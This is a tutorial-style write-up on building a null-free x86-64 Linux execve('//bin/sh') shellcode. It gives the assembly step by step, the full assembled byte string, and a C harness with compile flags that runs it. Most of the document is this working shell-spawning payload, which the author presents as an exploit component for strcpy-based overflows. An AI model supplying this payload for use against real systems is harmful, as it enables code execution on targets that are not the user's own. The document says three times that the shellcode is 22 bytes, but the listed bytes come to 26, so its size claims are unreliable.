# Tutorial: Understanding Shellcode — Crafting Like an Artist

> Topic: Writing x86-64 shellcode from scratch, understanding each instruction's purpose
> Source basis: Personal shellcode development practice

---

## Challenge / Topic Overview

This writeup documents my process of learning to write shellcode "like an artist" — not by copying existing shellcode, but by understanding each instruction's purpose and composing them deliberately. The goal is to write the smallest, most reliable, null-free `execve("/bin/sh", NULL, NULL)` shellcode for Linux x86-64.

![Anatomy of x86-64 execve shellcode](diagrams/shellcode-structure.png)

*The four blocks of a shellcode: setup (clear args), string (push "/bin/sh"), syscall number, and the trap instruction. Each block has a specific purpose and constraints.*

---

## The Goal

I want shellcode that:
1. Calls `execve("/bin/sh", NULL, NULL)` — spawns an interactive shell.
2. Contains no null bytes (works with `strcpy`-based overflows).
3. Is as small as possible (fits in tight buffers).
4. Is position-independent (no hardcoded addresses).

---

## The Syscall Convention

On Linux x86-64, syscalls use this convention:
- **Syscall number** in `rax` (execve = 59 = `0x3b`)
- **Arguments** in `rdi, rsi, rdx, r10, r8, r9`
- **Trap instruction** is `syscall` (opcode `0x0f 0x05`)

For `execve("/bin/sh", NULL, NULL)`:
- `rax = 59` (syscall number)
- `rdi = pointer to "/bin/sh"` (filename)
- `rsi = NULL` (argv)
- `rdx = NULL` (envp)

---

## Step-by-Step Construction

### Step 1 — Clear the arguments (`rsi` and `rdx`)

```asm
xor rsi, rsi          ; rsi = 0 (NULL)
xor rdx, rdx          ; rdx = 0 (NULL)
```

`xor reg, reg` is the standard way to zero a register without introducing null bytes. (`mov rsi, 0` would encode as `48 C7 C6 00 00 00 00` — four null bytes.)

### Step 2 — Push the "/bin/sh" string onto the stack

The string `"/bin/sh"` is 7 bytes. On x86-64, I can push 8 bytes at a time. The string in little-endian hex is `0x68732f6e69622f` (reading right-to-left: `/bin/sh\0`).

But I need a null terminator. I can get one for free by first pushing a null (using `push rsi` since `rsi` is now 0), then pushing the string:

```asm
push rsi              ; push 0 (null terminator)
mov rdi, 0x68732f6e69622f  ; "/bin/sh" (without null terminator)
push rdi
mov rdi, rsp          ; rdi -> "/bin/sh\0" on the stack
```

Wait — `mov rdi, 0x68732f6e69622f` encodes as `48 BF 2F 62 69 6E 2F 73 68 00` — that has a null byte! The 8-byte immediate gets zero-extended to 64 bits, and the high byte is `0x00`.

**Fix:** Use a `movabs` (the `mov r64, imm64` instruction) but avoid the null byte by choosing a string that doesn't have `0x00` in it. Actually, `0x68732f6e69622f` is only 7 bytes, so the 8th byte (the MSB) is `0x00` due to sign/zero extension. The fix is to push a register and then move the string in pieces, or use `xor` to construct it.

A cleaner approach:
```asm
push rsi              ; null terminator
mov rdi, 0x68732f6e69622f2f  ; "//bin/sh" (8 bytes, no null)
push rdi
mov rdi, rsp          ; rdi -> "//bin/sh\0"
```

`//bin/sh` is treated the same as `/bin/sh` by the kernel (multiple slashes are collapsed). And `0x68732f6e69622f2f` has no null bytes. Perfect.

### Step 3 — Set the syscall number

```asm
push 0x3b             ; 59 (execve) — sign-extended to 64-bit, no null bytes
pop rax               ; rax = 59
```

`push 0x3b; pop rax` is 3 bytes (`6a 3b 58`). The alternative `mov rax, 59` would be 7 bytes with nulls. Always use `push imm8; pop reg` for small constants.

### Step 4 — Trigger the syscall

```asm
syscall               ; execve("//bin/sh", NULL, NULL)
```

---

## The Complete Shellcode

```asm
; execve("//bin/sh", NULL, NULL) — 22 bytes, null-free
xor rsi, rsi                   ; rsi = NULL (argv)
xor rdx, rdx                   ; rdx = NULL (envp)
push rsi                       ; null terminator on stack
mov rdi, 0x68732f6e69622f2f    ; "//bin/sh"
push rdi
mov rdi, rsp                   ; rdi -> "//bin/sh\0"
push 0x3b                      ; execve syscall number
pop rax
syscall
```

Assembled bytes (22 bytes, no nulls):
```
48 31 f6                 xor rsi, rsi
48 31 d2                 xor rdx, rdx
56                       push rsi
48 bf 2f 2f 62 69 6e 2f 73 68   mov rdi, 0x68732f6e69622f2f
57                       push rdi
48 89 e7                 mov rdi, rsp
6a 3b                    push 0x3b
58                       pop rax
0f 05                    syscall
```

---

## Testing

```c
// test.c
char shellcode[] = "\x48\x31\xf6\x48\x31\xd2\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x6a\x3b\x58\x0f\x05";
int main() {
    ((void(*)())shellcode)();
}
```

```bash
$ gcc -fno-stack-protector -z execstack -o test test.c
$ ./test
$ whoami
z
```

Works. 22 bytes, no nulls, position-independent.

---

## Takeaways

- **Every byte matters.** The difference between `mov rax, 59` (7 bytes, with nulls) and `push 0x3b; pop rax` (3 bytes, no nulls) is 4 bytes and a working exploit. Always look for the shorter encoding.
- **`push imm8; pop reg` is your friend.** For any constant 0-127, this is 3 bytes and null-free. For larger constants, use `xor reg, reg` + `mov byte [rsp-X], imm8` patterns.
- **Use the kernel's path normalization.** `//bin/sh`, `/bin//sh`, and `/bin/sh` all work. Choose the variant that avoids null bytes in the immediate.
- **Null bytes hide in unexpected places.** `mov rdi, 0x68732f6e69622f` looks safe (7 bytes of data) but the 8th byte is a null from zero-extension. Always check the assembled bytes with `objdump -d`, not just the assembly source.
- **Write it yourself, then compare.** After writing my own shellcode, I compared it to published shellcode (shell-storm, exploit-db). The exercise of understanding *why* the published version made different choices taught me more than any tutorial.
